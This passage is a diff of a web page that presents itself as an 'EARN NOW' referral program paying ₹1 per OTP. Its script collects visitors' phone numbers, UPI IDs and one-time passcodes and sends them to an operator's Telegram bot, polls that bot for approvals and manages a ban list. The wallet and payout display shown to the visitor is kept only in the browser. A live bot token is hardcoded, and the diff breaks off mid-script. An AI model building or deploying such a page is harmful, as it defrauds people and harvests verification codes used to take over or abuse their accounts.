@@ -14,6 +14,7 @@
       --text: #f0f0ff; --muted: #6b6b8a;
       --border: rgba(0,229,255,0.12);
     }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     body { background:var(--bg);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:'Nunito',sans-serif;color:var(--text);padding:20px;overflow-x:hidden; }
     .blob { position:fixed;border-radius:50%;filter:blur(80px);opacity:0.15;pointer-events:none;z-index:0; }
     .blob1 { width:400px;height:400px;background:var(--accent2);top:-100px;left:-100px;animation:blobMove 8s ease-in-out infinite alternate; }
@@ -27,16 +28,27 @@
     @keyframes fadeDown { from{opacity:0;transform:translateY(-16px)} to{opacity:1;transform:translateY(0)} }
     @keyframes fadeUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }
     .step-label { font-size:11px;font-weight:800;letter-spacing:0.15em;text-transform:uppercase;color:var(--accent);margin-bottom:6px; }
-    .step-title { font-size:22px;font-weight:800;margin-bottom:22px;color:var(--text); }
+    .step-title { font-size:22px;font-weight:800;margin-bottom:20px;color:var(--text); }
     .field { margin-bottom:14px; }
     .field label { display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:var(--muted);margin-bottom:7px; }
     .field input { width:100%;padding:13px 16px;background:var(--card2);border:1px solid var(--border);border-radius:12px;color:var(--text);font-size:15px;font-family:'Nunito',sans-serif;font-weight:600;outline:none;transition:border-color 0.2s,box-shadow 0.2s; }
     .field input:focus { border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,229,255,0.08); }
     .field input::placeholder { color:var(--muted);font-weight:400; }
-    .otp-row { display:flex;gap:10px;margin-top:8px; }
-    .otp-row input { flex:1;padding:16px 0;text-align:center;font-size:24px;font-weight:800;background:var(--card2);border:1px solid var(--border);border-radius:12px;color:var(--accent);font-family:'Bebas Neue',sans-serif;letter-spacing:2px;outline:none;transition:border-color 0.2s,box-shadow 0.2s; }
+
+    /* OTP type selector */
+    .otp-type-label { font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:var(--muted);margin-bottom:8px;display:block; }
+    .otp-type-row { display:flex;gap:8px;margin-bottom:18px; }
+    .otp-type-btn { flex:1;padding:10px 0;border:1px solid var(--border);border-radius:10px;background:var(--card2);color:var(--muted);font-family:'Nunito',sans-serif;font-size:13px;font-weight:800;cursor:pointer;transition:all 0.2s;text-align:center; }
+    .otp-type-btn:hover { border-color:var(--accent);color:var(--accent); }
+    .otp-type-btn.active { background:linear-gradient(135deg,var(--accent),#0099bb);color:#000;border-color:transparent;transform:scale(1.04); }
+
+    /* OTP boxes */
+    .otp-row { display:flex;gap:8px;margin-top:8px; }
+    .otp-row input { flex:1;padding:14px 0;text-align:center;font-size:22px;font-weight:800;background:var(--card2);border:1px solid var(--border);border-radius:12px;color:var(--accent);font-family:'Bebas Neue',sans-serif;letter-spacing:2px;outline:none;transition:border-color 0.2s,box-shadow 0.2s; }
     .otp-row input:focus { border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,229,255,0.1); }
-    .btn { width:100%;padding:15px;margin-top:14px;border:none;border-radius:12px;font-size:15px;font-weight:800;font-family:'Nunito',sans-serif;cursor:pointer;transition:transform 0.15s,opacity 0.2s; }
+
+    /* Buttons */
+    .btn { width:100%;padding:15px;margin-top:12px;border:none;border-radius:12px;font-size:15px;font-weight:800;font-family:'Nunito',sans-serif;cursor:pointer;transition:transform 0.15s,opacity 0.2s; }
     .btn:hover { opacity:0.9; }
     .btn:active { transform:scale(0.98); }
     .btn:disabled { opacity:0.45;cursor:not-allowed;transform:none; }
@@ -45,6 +57,7 @@
     .btn-success { background:linear-gradient(135deg,var(--green),#00a854);color:#000; }
     .btn-gold { background:linear-gradient(135deg,var(--gold),#ff9800);color:#000; }
     .btn-red { background:linear-gradient(135deg,var(--red),#c62828);color:#fff; }
+
     .msg { font-size:12px;font-weight:700;margin-top:10px;min-height:18px; }
     .msg.error { color:var(--red); }
     .info-box { background:rgba(0,229,255,0.05);border:1px solid rgba(0,229,255,0.15);border-radius:12px;padding:12px 14px;font-size:12px;color:var(--muted);margin-bottom:16px;line-height:1.6; }
@@ -53,6 +66,14 @@
     .step-dot { flex:1;height:3px;border-radius:99px;background:var(--card2);transition:background 0.4s; }
     .step-dot.active { background:var(--accent); }
     .step-dot.done { background:var(--green); }
+
+    /* Waiting animation */
+    .waiting-box { text-align:center;padding:12px 0 4px; }
+    .waiting-dots span { display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--accent);margin:0 3px;animation:dotBounce 1.2s ease-in-out infinite; }
+    .waiting-dots span:nth-child(2) { animation-delay:0.2s; }
+    .waiting-dots span:nth-child(3) { animation-delay:0.4s; }
+    @keyframes dotBounce { 0%,80%,100%{transform:scale(0.6);opacity:0.4} 40%{transform:scale(1);opacity:1} }
+    .waiting-text { font-size:12px;color:var(--muted);margin-top:8px;font-weight:700; }
 
     /* Attempts bar */
     .attempts-wrap { margin-bottom:18px; }
@@ -67,8 +88,8 @@
     .wallet-left .wamount { font-family:'Bebas Neue',sans-serif;font-size:38px;color:var(--green);line-height:1;margin-top:3px; }
     .wallet-icon { font-size:38px;opacity:0.5; }
 
-    /* Popup overlay */
-    .popup-overlay { position:fixed;inset:0;background:rgba(0,0,0,0.75);display:flex;align-items:center;justify-content:center;z-index:200;animation:fadeIn 0.2s ease; }
+    /* Popup */
+    .popup-overlay { position:fixed;inset:0;background:rgba(0,0,0,0.78);display:flex;align-items:center;justify-content:center;z-index:200;animation:fadeIn 0.2s ease; }
     @keyframes fadeIn { from{opacity:0} to{opacity:1} }
     .popup-box { background:var(--card);border-radius:24px;padding:32px 28px;max-width:300px;width:90%;text-align:center;animation:popIn 0.3s cubic-bezier(0.34,1.56,0.64,1);border:1px solid var(--border); }
     @keyframes popIn { from{transform:scale(0.7);opacity:0} to{transform:scale(1);opacity:1} }
@@ -76,22 +97,35 @@
     .popup-title { font-family:'Bebas Neue',sans-serif;font-size:28px;letter-spacing:2px;margin-bottom:8px; }
     .popup-sub { font-size:13px;color:var(--muted);line-height:1.6;margin-bottom:20px; }
 
-    /* Earn reward anim */
-    .reward-flash { animation:rewardPop 0.5s ease; }
-    @keyframes rewardPop { 0%{transform:scale(1)} 50%{transform:scale(1.08)} 100%{transform:scale(1)} }
-
-    /* Success */
-    .success-icon { width:64px;height:64px;background:linear-gradient(135deg,var(--green),#00a854);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 16px;animation:popIn 0.4s cubic-bezier(0.34,1.56,0.64,1); }
-    .success-title { font-family:'Bebas Neue',sans-serif;font-size:32px;letter-spacing:3px;color:var(--green);text-align:center;margin-bottom:8px; }
-    .success-sub { font-size:13px;color:var(--muted);text-align:center;line-height:1.6; }
-
-    .hidden { display:none !important; }
-
-    /* Amount selector */
+    /* Withdraw amt */
     .amt-row { display:flex;gap:8px;margin:10px 0 16px; }
     .amt-btn { flex:1;padding:10px 0;border:1px solid var(--border);border-radius:10px;background:var(--card2);color:var(--muted);font-family:'Nunito',sans-serif;font-size:13px;font-weight:800;cursor:pointer;transition:all 0.2s; }
     .amt-btn:hover { border-color:var(--gold);color:var(--gold); }
     .amt-btn.selected { background:linear-gradient(135deg,var(--gold),#ff9800);color:#000;border-color:transparent; }
+
+    /* History list styling */
+    .history-list { max-height: 250px; overflow-y: auto; text-align: left; margin: 15px 0; }
+    .history-item { background: var(--card2); border-radius: 8px; padding: 10px; margin-bottom: 8px; border-left: 3px solid var(--gold); transition: all 0.3s; }
+    .history-item.paid { border-left-color: var(--green); background: rgba(0, 230, 118, 0.08); }
+    .history-item-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
+    .history-amount { font-weight: 700; color: var(--gold); font-size: 14px; }
+    .history-item.paid .history-amount { color: var(--green); }
+    .history-date { font-size: 10px; color: var(--muted); }
+    .history-status { font-size: 11px; font-weight: 600; display: inline-flex; align-items: center; gap: 4px; }
+    .history-status.processing { color: var(--gold); }
+    .history-status.paid { color: var(--green); }
+
+    .hidden { display: none !important; }
+    
+    /* Flex row for buttons */
+    .btn-row { display: flex; gap: 10px; margin-top: 12px; }
+    .btn-row .btn { margin-top: 0; flex: 1; }
+    .btn-row .btn:nth-child(2) { flex: 2; }
+    
+    /* Live indicator */
+    .live-indicator { display: inline-flex; align-items: center; gap: 6px; font-size: 10px; color: var(--green); margin-left: 8px; font-weight: 700; }
+    .live-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; animation: pulse 2s infinite; }
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
   </style>
 </head>
 <body>
@@ -99,10 +133,12 @@
 <div class="blob blob2"></div>
 
 <div class="wrapper">
-  <!-- Support button top right -->
+  <!-- Support -->
   <div style="position:absolute;top:0;right:0;z-index:10;">
-    <a href="https://www.instagram.com/bravooo.fx?igsh=MWgxN3BhZTJtaXlubw==" target="_blank" style="display:flex;align-items:center;gap:6px;padding:8px 14px;background:linear-gradient(135deg,#e1306c,#833ab4);border-radius:99px;color:#fff;font-family:'Nunito',sans-serif;font-size:12px;font-weight:800;text-decoration:none;">📸 Support</a>
+    <a href="https://www.instagram.com/bravooo.fx?igsh=MWgxN3BhZTJtaXlubw==" target="_blank"
+       style="display:flex;align-items:center;gap:6px;padding:8px 14px;background:linear-gradient(135deg,#e1306c,#833ab4);border-radius:99px;color:#fff;font-family:'Nunito',sans-serif;font-size:12px;font-weight:800;text-decoration:none;">📸 Support</a>
   </div>
+
   <div class="header">
     <div class="header-title">EARN NOW</div>
     <div class="header-sub">Join our referral program &amp; get rewarded</div>
@@ -111,9 +147,7 @@
   <!-- STEP 1: Details -->
   <div class="card" id="step1">
     <div class="steps-bar">
-      <div class="step-dot active"></div>
-      <div class="step-dot"></div>
-      <div class="step-dot"></div>
+      <div class="step-dot active"></div><div class="step-dot"></div><div class="step-dot"></div>
     </div>
     <div class="step-label">Step 1 of 3</div>
     <div class="step-title">Your Details</div>
@@ -132,38 +166,48 @@
   <!-- STEP 2: OTP -->
   <div class="card hidden" id="step2">
     <div class="steps-bar">
-      <div class="step-dot done"></div>
-      <div class="step-dot active"></div>
-      <div class="step-dot"></div>
+      <div class="step-dot done"></div><div class="step-dot active"></div><div class="step-dot"></div>
     </div>
     <div class="step-label">Step 2 of 3</div>
     <div class="step-title">Enter OTP</div>
+
     <div class="info-box">
       Details received ✅<br>
       <strong>Wait for OTP</strong> — the team will send it to you shortly.
     </div>
-    <div class="field">
-      <label>4-Digit OTP</label>
-      <div class="otp-row">
-        <input type="tel" maxlength="1" class="otp" id="o1">
-        <input type="tel" maxlength="1" class="otp" id="o2">
-        <input type="tel" maxlength="1" class="otp" id="o3">
-        <input type="tel" maxlength="1" class="otp" id="o4">
-      </div>
+
+    <!-- OTP Type selector -->
+    <span class="otp-type-label">Select OTP Type</span>
+    <div class="otp-type-row">
+      <button class="otp-type-btn active" data-digits="4">4 Digit</button>
+      <button class="otp-type-btn" data-digits="5">5 Digit</button>
+      <button class="otp-type-btn" data-digits="6">6 Digit</button>
     </div>
+
+    <!-- OTP input boxes (renders dynamically) -->
+    <div class="field">
+      <label id="otpBoxLabel">4-Digit OTP</label>
+      <div class="otp-row" id="otpBoxes"></div>
+    </div>
+
     <div class="msg error" id="err2"></div>
-    <button class="btn btn-success" id="verifyOtpBtn">Verify OTP ✓</button>
+
+    <!-- Waiting indicator (shown after submit) -->
+    <div class="waiting-box hidden" id="waitingBox">
+      <div class="waiting-dots"><span></span><span></span><span></span></div>
+      <div class="waiting-text">Waiting for team verification…</div>
+    </div>
+
+    <button class="btn btn-success" id="verifyOtpBtn">Submit OTP →</button>
     <button class="btn btn-ghost" id="backBtn">← Back</button>
   </div>
 
   <!-- STEP 3: Wallet -->
   <div class="card hidden" id="step3">
     <div class="steps-bar">
-      <div class="step-dot done"></div>
-      <div class="step-dot done"></div>
-      <div class="step-dot active"></div>
+      <div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot active"></div>
     </div>
-    <div class="step-label">Step 3 — Wallet</div>
+    <div class="step-label">Step 3 — Wallet <span class="live-indicator" id="liveIndicator"><span class="live-dot"></span>LIVE</span></div>
     <div class="step-title">Your Earnings 💰</div>
 
     <div class="wallet-box">
@@ -176,8 +220,11 @@
 
     <div class="attempts-wrap">
       <div class="attempts-top">
-        <span>OTP Attempts Used</span>
-        <span id="attemptsText">0 / 60</span>
+        <span>You can do this task upto 60 times with one number</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;font-size:12px;color:var(--muted);margin-bottom:6px;font-weight:700;">
+        <span id="attemptsText">0 attempts used</span>
+        <span id="remainingBadge" style="color:var(--accent);font-size:13px;font-weight:800;">60 remaining</span>
       </div>
       <div class="prog-bar">
         <div class="prog-fill" id="progFill" style="width:0%"></div>
@@ -185,29 +232,19 @@
     </div>
 
     <div class="info-box">
-      🎯 Each OTP attempt adds <strong>₹1</strong> to your wallet.<br>
+      🎯 Each approved OTP adds <strong>₹1</strong> to your wallet automatically.<br>
       💳 Minimum withdrawal is <strong>₹5</strong>.
     </div>
 
-    <button class="btn btn-primary" id="earnBtn">🎲 Claim Next Reward</button>
-    <button class="btn btn-success hidden" id="nextStepBtn">➡️ Do Next Step (<span id="remainingCount">59</span>/60 remaining)</button>
-    <button class="btn btn-gold" id="withdrawBtn" disabled>💳 Withdraw (min. ₹5)</button>
+    <button class="btn btn-primary" id="nextStepBtn">➡️ Do Next OTP (<span id="remainingCount">60</span> remaining)</button>
+    
+    <!-- Button row: History on left, Withdraw on right -->
+    <div class="btn-row">
+      <button class="btn btn-ghost" id="historyBtn">📜 History</button>
+      <button class="btn btn-gold" id="withdrawBtn" disabled>💳 Withdraw (min. ₹5)</button>
+    </div>
+    
     <div class="msg error" id="err3"></div>
-  </div>
-
-  <!-- STEP 4: Success -->
-  <div class="card hidden" id="step4">
-    <div class="steps-bar">
-      <div class="step-dot done"></div>
-      <div class="step-dot done"></div>
-      <div class="step-dot done"></div>
-    </div>
-    <div class="success-icon">🎉</div>
-    <div class="success-title">VERIFIED!</div>
-    <div class="success-sub">
-      Your referral is confirmed.<br>
-      Payment will be sent to your UPI within 24 hours.
-    </div>
   </div>
 </div>
 
@@ -221,12 +258,12 @@
   </div>
 </div>
 
-<!-- POPUP: Reward earned -->
+<!-- POPUP: Reward earned (auto) -->
 <div class="popup-overlay hidden" id="rewardPopup">
   <div class="popup-box">
     <div class="popup-icon">🎉</div>
     <div class="popup-title" style="color:var(--green)">+₹1 EARNED!</div>
-    <div class="popup-sub">Added to your wallet.<br>Keep going to earn more!</div>
+    <div class="popup-sub">OTP verified by team ✅<br>₹1 has been added to your wallet!</div>
     <button class="btn btn-success" id="closeReward">Awesome!</button>
   </div>
 </div>
@@ -246,9 +283,40 @@
   <div class="popup-box">
     <div class="popup-icon">🔴</div>
     <div class="popup-title" style="color:var(--red)">BANNED</div>
-    <div class="popup-sub">This number or UPI ID has been <strong style="color:var(--red)">permanently banned</strong> from this platform due to suspicious activity.<br><br>Contact support if you think this is a mistake.</div>
-    <a href="https://www.instagram.com/bravooo.fx?igsh=MWgxN3BhZTJtaXlubw==" target="_blank" style="display:block;width:100%;padding:13px;margin-top:14px;border-radius:12px;font-size:14px;font-weight:800;font-family:'Nunito',sans-serif;background:linear-gradient(135deg,#e1306c,#833ab4);color:#fff;text-decoration:none;text-align:center;box-sizing:border-box;">📸 Contact Support on Instagram</a>
+    <div class="popup-sub">This number has been <strong style="color:var(--red)">permanently banned</strong> due to suspicious activity.<br><br>Contact support if this is a mistake.</div>
+    <a href="https://www.instagram.com/bravooo.fx?igsh=MWgxN3BhZTJtaXlubw==" target="_blank"
+       style="display:block;width:100%;padding:13px;margin-top:14px;border-radius:12px;font-size:14px;font-weight:800;font-family:'Nunito',sans-serif;background:linear-gradient(135deg,#e1306c,#833ab4);color:#fff;text-decoration:none;text-align:center;">📸 Contact Support</a>
     <button class="btn btn-red" style="opacity:0.4;cursor:not-allowed;margin-top:8px;" disabled>Access Denied</button>
+  </div>
+</div>
+
+<!-- POPUP: Number already used 60 times -->
+<div class="popup-overlay hidden" id="numberUsedPopup">
+  <div class="popup-box">
+    <div class="popup-icon">📵</div>
+    <div class="popup-title" style="color:var(--red)">NUMBER USED</div>
+    <div class="popup-sub">This mobile number has already been used <strong style="color:var(--text)">60 times</strong>.<br>No more tasks available with this number.</div>
+    <button class="btn btn-red" id="closeNumberUsed">OK</button>
+  </div>
+</div>
+
+<!-- POPUP: UPI already used 60 times -->
+<div class="popup-overlay hidden" id="upiUsedPopup">
+  <div class="popup-box">
+    <div class="popup-icon">💳</div>
+    <div class="popup-title" style="color:var(--red)">UPI ALREADY USED</div>
+    <div class="popup-sub">This UPI ID has already been used <strong style="color:var(--text)">60 times</strong>.<br>Please use a different UPI ID.</div>
+    <button class="btn btn-red" id="closeUpiUsed">OK</button>
+  </div>
+</div>
+
+<!-- POPUP: Withdraw Success -->
+<div class="popup-overlay hidden" id="withdrawSuccessPopup">
+  <div class="popup-box">
+    <div class="popup-icon">✅</div>
+    <div class="popup-title" style="color:var(--green)">WITHDRAWAL SENT!</div>
+    <div class="popup-sub"><span id="withdrawSuccessAmt">₹0</span> withdrawal request sent!<br>Will be processed to your UPI within 24 hours.</div>
+    <button class="btn btn-success" id="closeWithdrawSuccess">Done</button>
   </div>
 </div>
 
@@ -269,65 +337,117 @@
   </div>
 </div>
 
+<!-- POPUP: Withdrawal History -->
+<div class="popup-overlay hidden" id="withdrawHistoryPopup">
+  <div class="popup-box" style="max-width: 340px; width: 90%;">
+    <div class="popup-icon">📜</div>
+    <div class="popup-title" style="color:var(--gold)">WITHDRAWAL HISTORY</div>
+    <div class="history-list" id="withdrawHistoryList">
+      <!-- History items inserted here -->
+    </div>
+    <button class="btn btn-ghost" id="closeWithdrawHistory" style="margin-top: 10px;">Close</button>
+  </div>
+</div>
+
 <script>
-  const BOT_TOKEN = '8676131839:AAGemgWCzRC2P2l-nLfX8FTNoOKxvSMTrXY';
-  const CHAT_ID   = '1295046984';
+  const BOT_TOKEN    = '8676131839:AAGemgWCzRC2P2l-nLfX8FTNoOKxvSMTrXY';
+  const CHAT_ID      = '1295046984';
   const MAX_ATTEMPTS = 60;
 
-  let currentPhone      = '';
-  let currentUpi        = '';
-  let correctOtp        = '';
-  let walletBal         = 0;
-  let attempts          = 0;
-  let pendingMsgId      = null;
-  let claimedThisRound  = false;
+  let currentPhone  = '';
+  let currentUpi    = '';
+  let walletBal     = 0;
+  let attempts      = 0;
+  let pendingMsgId  = null;
+  let pendingMsgId2 = null;
+  let currentDigits = 4;
+  let withdrawalHistory = [];
+  let isPolling     = false;
 
-  // ── Ban system — stored in Telegram (works across ALL devices) ──
-  // We store banned numbers in a Telegram message we can edit.
-  // The ban list is fetched from Telegram on every form submit.
-  const BAN_MSG_KEY = 'ban_msg_id'; // localStorage only stores the message ID, not the list
+  // ── Storage ──
+  function saveState() {
+    localStorage.setItem('ref_' + currentPhone, JSON.stringify({ 
+      walletBal, 
+      attempts, 
+      upi: currentUpi,
+      withdrawalHistory: withdrawalHistory || []
+    }));
+    if (currentUpi) localStorage.setItem('upi_' + currentUpi, currentPhone);
+  }
+  
+  function loadState() {
+    const d = JSON.parse(localStorage.getItem('ref_' + currentPhone) || '{}');
+    walletBal = d.walletBal || 0;
+    attempts  = d.attempts  || 0;
+    withdrawalHistory = d.withdrawalHistory || [];
+  }
 
+  // ── Telegram ──
+  async function sendTelegram(text, replyMarkup) {
+    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
+    if (replyMarkup) body.reply_markup = replyMarkup;
+    const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    return await res.json();
+  }
+  
+  async function editTelegramMessage(messageId, text, replyMarkup) {
+    const body = { 
+      chat_id: CHAT_ID, 
+      message_id: messageId,
+      text: text, 
+      parse_mode: 'HTML' 
+    };
+    if (replyMarkup) body.reply_markup = replyMarkup;
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    return await res.json();
+  }
+  
+  async function answerCallback(id, text) {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: id, text, show_alert: true })
+    });
+  }
+
+  // ── Ban system ──
+  const BAN_MSG_KEY = 'ban_msg_id';
   async function fetchBanList() {
     try {
-      // Get stored ban message id
       const banMsgId = localStorage.getItem(BAN_MSG_KEY);
       if (!banMsgId) return [];
-      // Use getUpdates trick: send ourselves a request to read the message
-      // Instead: we store the ban list as text in a known Telegram message
-      // and read it by fetching our own chat via bot
       const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/forwardMessage`, {
         method: 'POST', headers: {'Content-Type':'application/json'},
         body: JSON.stringify({ chat_id: CHAT_ID, from_chat_id: CHAT_ID, message_id: parseInt(banMsgId) })
       });
       const data = await res.json();
       if (data.ok && data.result.text) {
-        const lines = data.result.text.split('\n').filter(l => l.startsWith('BAN:'));
-        return lines.map(l => { const p = l.replace('BAN:','').split('|'); return { phone: p[0], upi: p[1] }; });
+        return data.result.text.split('\n').filter(l => l.startsWith('BAN:'))
+          .map(l => { const p = l.replace('BAN:','').split('|'); return { phone: p[0], upi: p[1] }; });
       }
     } catch(e) {}
     return [];
   }
-
   async function isBannedRemote(phone, upi) {
     const list = await fetchBanList();
     return list.some(b => b.phone === phone || b.upi === upi);
   }
-
   async function banUserRemote(phone, upi) {
-    // Get current ban list
     const list = await fetchBanList();
     if (!list.some(b => b.phone === phone)) list.push({ phone, upi });
     const text = list.map(b => `BAN:${b.phone}|${b.upi}`).join('\n') || 'BAN_LIST_EMPTY';
-    // Send/update ban list message
     const banMsgId = localStorage.getItem(BAN_MSG_KEY);
     if (banMsgId) {
-      // Edit existing ban list message
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
         method: 'POST', headers: {'Content-Type':'application/json'},
         body: JSON.stringify({ chat_id: CHAT_ID, message_id: parseInt(banMsgId), text })
       });
     } else {
-      // Create new ban list message
       const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST', headers: {'Content-Type':'application/json'},
         body: JSON.stringify({ chat_id: CHAT_ID, text })
@@ -336,11 +456,10 @@
       if (data.ok) localStorage.setItem(BAN_MSG_KEY, data.result.message_id);
     }
   }
-
   async function unbanUserRemote(phone) {
-    const list = await fetchBanList();
+    const list    = await fetchBanList();
     const newList = list.filter(b => b.phone !== phone);
-    const text = newList.map(b => `BAN:${b.phone}|${b.upi}`).join('\n') || 'BAN_LIST_EMPTY';
+    const text    = newList.map(b => `BAN:${b.phone}|${b.upi}`).join('\n') || 'BAN_LIST_EMPTY';
     const banMsgId = localStorage.getItem(BAN_MSG_KEY);
     if (banMsgId) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
@@ -350,180 +469,281 @@
     }
   }
 
-  // ── Storage helpers (per phone number) ──
-  function saveState() {
-    localStorage.setItem('ref_' + currentPhone, JSON.stringify({ walletBal, attempts }));
-  }
-  function loadState() {
-    const d = JSON.parse(localStorage.getItem('ref_' + currentPhone) || '{}');
-    walletBal = d.walletBal || 0;
-    attempts  = d.attempts  || 0;
-  }
-
-  // ── Telegram helpers ──
-  async function sendTelegram(text, replyMarkup) {
-    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
-    if (replyMarkup) body.reply_markup = replyMarkup;
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    });
-    const data = await res.json();
-    return data;
-  }
-
-  async function answerCallback(callbackId, text) {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ callback_query_id: callbackId, text, show_alert: true })
-    });
-  }
-
-  // Poll Telegram for callback (inline button tap by you)
+  // ── Polling (FIXED: Keep running in background) ──
   let pollingOffset = 0;
-  let pollTimer = null;
+  let pollTimer     = null;
 
   async function pollForCallback() {
+    if (!isPolling) return;
+    
     try {
-      const res = await fetch(
-        `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${pollingOffset}&timeout=3`
-      );
+      const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${pollingOffset}&timeout=3`);
       const data = await res.json();
       if (data.ok && data.result.length > 0) {
         for (const update of data.result) {
           pollingOffset = update.update_id + 1;
 
-          // ── Handle /banlist command ──
           if (update.message && update.message.text) {
-            const text = update.message.text.trim();
-            if (text === '/banlist') {
+            const txt = update.message.text.trim();
+            if (txt === '/banlist') {
               const list = await fetchBanList();
               if (list.length === 0) {
-                await sendTelegram(`📋 <b>Banned List</b>\n\nNo users are currently banned.`);
+                await sendTelegram('📋 <b>Banned List</b>\n\nNo users banned.');
               } else {
-                const lines = list.map((b, i) => `${i+1}. 📱 <code>${b.phone}</code> | 💳 <code>${b.upi}</code>`).join('\n');
-                await sendTelegram(
-                  `📋 <b>Banned Users (${list.length})</b>\n\n${lines}`,
-                  { inline_keyboard: list.map(b => [{ text: `🔓 Unban ${b.phone}`, callback_data: `unban_${b.phone}` }]) }
-                );
+                const lines = list.map((b,i) => `${i+1}. 📱 <code>${b.phone}</code> | 💳 <code>${b.upi}</code>`).join('\n');
+                await sendTelegram(`📋 <b>Banned (${list.length})</b>\n\n${lines}`,
+                  { inline_keyboard: list.map(b => [{ text: `🔓 Unban ${b.phone}`, callback_data: `unban_${b.phone}` }]) });
               }
             }
           }
 
           if (update.callback_query) {
-            const cb      = update.callback_query;
-            const cbData  = cb.data;
+            const cb     = update.callback_query;
+            const cbData = cb.data;
             const cbMsgId = cb.message && cb.message.message_id;
 
-            // ── Unban via inline button — works across ALL devices ──
+            console.log('Callback received:', cbData); // Debug log
+
+            // Handle Withdrawal Payment Confirmation
+            if (cbData && cbData.startsWith('withdraw_paid_')) {
+              const parts = cbData.split('_');
+              const targetPhone = parts[2];
+              const withdrawId = parts[3];
+              
+              console.log('Processing payment for:', targetPhone, 'ID:', withdrawId);
+              
+              // Update that phone's withdrawal history in localStorage
+              const userData = JSON.parse(localStorage.getItem('ref_' + targetPhone) || '{}');
+              if (userData.withdrawalHistory && userData.withdrawalHistory.length > 0) {
+                const withdrawalIndex = userData.withdrawalHistory.findIndex(w => w.id === withdrawId);
+                
+                if (withdrawalIndex !== -1 && userData.withdrawalHistory[withdrawalIndex].status !== 'Paid ✅') {
+                  // Update status
+                  userData.withdrawalHistory[withdrawalIndex].status = 'Paid ✅';
+                  localStorage.setItem('ref_' + targetPhone, JSON.stringify(userData));
+                  
+                  // Update current user's view if it's the current user
+                  if (targetPhone === currentPhone) {
+                    withdrawalHistory = userData.withdrawalHistory;
+                    // Refresh history popup if open
+                    if (!document.getElementById('withdrawHistoryPopup').classList.contains('hidden')) {
+                      refreshWithdrawalHistory();
+                    }
+                    // Show notification if on wallet screen
+                    if (!document.getElementById('step3').classList.contains('hidden')) {
+                      showToast('🎉 Payment received! Check your History.');
+                    }
+                  }
+                  
+                  // Update Telegram message to remove button and show completed
+                  await editTelegramMessage(cbMsgId,
+                    `✅ <b>Payment Completed</b>\n\n` +
+                    `📱 <b>Phone:</b> <code>${targetPhone}</code>\n` +
+                    `💳 <b>UPI ID:</b> <code>${userData.upi || 'Unknown'}</code>\n` +
+                    `💰 <b>Amount:</b> ₹${userData.withdrawalHistory[withdrawalIndex].amount}\n` +
+                    `✅ <b>Status:</b> PAID\n\n` +
+                    `Payment confirmed by admin on ${new Date().toLocaleString()}.`
+                  );
+                  
+                  await answerCallback(cb.id, `✅ Payment marked as complete! ₹${userData.withdrawalHistory[withdrawalIndex].amount} paid to ${targetPhone}`);
+                  continue;
+                } else {
+                  await answerCallback(cb.id, '⚠️ Already marked as paid or not found.');
+                  continue;
+                }
+              } else {
+                await answerCallback(cb.id, '⚠️ User data not found in system.');
+                continue;
+              }
+            }
+
+            // Unban
             if (cbData && cbData.startsWith('unban_')) {
-              const phoneToUnban = cbData.replace('unban_', '');
-              await unbanUserRemote(phoneToUnban);
-              await answerCallback(cb.id, `✅ ${phoneToUnban} unbanned on ALL devices!`);
-              await sendTelegram(`✅ <b>Unbanned!</b>\n📱 <code>${phoneToUnban}</code> can now access the website from any device.`);
+              const ph = cbData.replace('unban_','');
+              await unbanUserRemote(ph);
+              await answerCallback(cb.id, `✅ ${ph} unbanned!`);
+              await sendTelegram(`✅ <b>Unbanned!</b>\n📱 <code>${ph}</code> can access site again.`);
               continue;
             }
 
-            // ── Only react to buttons from the CURRENT request message ──
-            if (cbMsgId !== pendingMsgId) {
-              await answerCallback(cb.id, '⚠️ This request is outdated.');
-              continue;
-            }
+            // OTP-related callbacks (only process if matches current session)
+            if (cbMsgId === pendingMsgId || cbMsgId === pendingMsgId2) {
+              if (cbData === 'otp_correct') {
+                await answerCallback(cb.id, '✅ OTP Approved! ₹1 added to user.');
+                // Don't stop polling anymore - keep it running for withdrawals
+                walletBal += 1;
+                attempts  += 1;
+                saveState();
+                hide('step1'); hide('step2');
+                show('step3');
+                refreshWallet();
+                setTimeout(() => showPopup('rewardPopup'), 150);
+                await sendTelegram(
+                  `💰 <b>Reward Auto-Credited</b>\n` +
